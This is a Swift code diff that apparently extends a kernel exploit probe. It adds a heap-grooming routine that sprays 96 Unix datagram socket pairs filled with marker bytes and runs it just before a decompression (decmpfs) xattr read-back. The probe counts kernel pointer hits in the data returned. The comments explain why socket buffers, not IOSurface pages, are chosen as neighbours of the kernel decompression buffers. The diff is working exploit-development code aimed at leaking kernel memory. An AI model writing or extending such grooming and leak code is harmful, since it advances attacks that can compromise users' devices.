@@ -291,6 +291,29 @@ enum Runners {
         return held
     }
     private static var groomHold: [UnsafeMutableRawPointer?] = []
+    // THE SOCKET GROOM (2026-11-07 law): the kernel's decompression chunk
+    // buffers DO NOT neighbor IOSurface pages (the 01:01 run: groomed, hits
+    // still 0) — they neighbor SOCKET BUFFER allocations. 96 SOCK_DGRAM
+    // pairs with marker bytes in their kernel send buffers, held through
+    // the read.
+    private static var groomSockets: [(Int32, Int32)] = []
+    static func groomSocketsSpray(_ n: Int) -> Int {
+        var made = 0
+        for _ in 0..<n {
+            var sv: [Int32] = [0, 0]
+            let r = socketpair(AF_UNIX, SOCK_DGRAM, 0, &sv)
+            if r == 0 {
+                let payload = [UInt8](repeating: 0x77, count: 0x1000)
+                _ = payload.withUnsafeBytes { raw in
+                    send(sv[0], raw.baseAddress, raw.count, 0)
+                }
+                groomSockets.append((sv[0], sv[1]))
+                made += 1
+            }
+        }
+        return made
+    }
+    static func groomSocketsRelease() { groomSockets.removeAll() }
     static func groomRelease() { groomHold.removeAll(); groomHold = [] }
 
     static func decmpfsProbe(at url: URL, uncompressed: Int, chunks: Int, producePerChunk: Int) -> DecmpfsResult {
@@ -310,10 +333,13 @@ enum Runners {
                                  note: tl("setxattr 失败 errno=") + "\(errno)")
         }
 
-        // THE GROOM: IOSurface pressure right before the read (marker 0x77)
+        // THE GROOM v2: socket-buffer pressure (the 01:01 law — IOSurface
+        // pages never neighbor the decompression chunk buffers; SOCK_DGRAM
+        // kernel buffers do) + the IOSurface keep (harmless to hold)
         var groomNote = ""
         let g = groomSurfaces(8, size: 0x4000, marker: 0x77)
-        groomNote = g >= 0 ? " groom=\(g)x0x4000@0x77" : " groom=unavailable"
+        let gs = groomSocketsSpray(96)
+        groomNote = " groom=\(g)surf+\(gs)sock@0x77"
 
         guard let back = try? Data(contentsOf: url) else {
             groomRelease()
@@ -337,6 +363,7 @@ enum Runners {
                 i += 8
             }
         }
+        groomSocketsRelease()
         groomRelease()
         return DecmpfsResult(wroteXattr: true, readBack: back.count, kernelPointerHits: hits,
                              samples: samples, note: tl("读取 ") + "\(back.count)" + tl(" 字节") + groomNote)
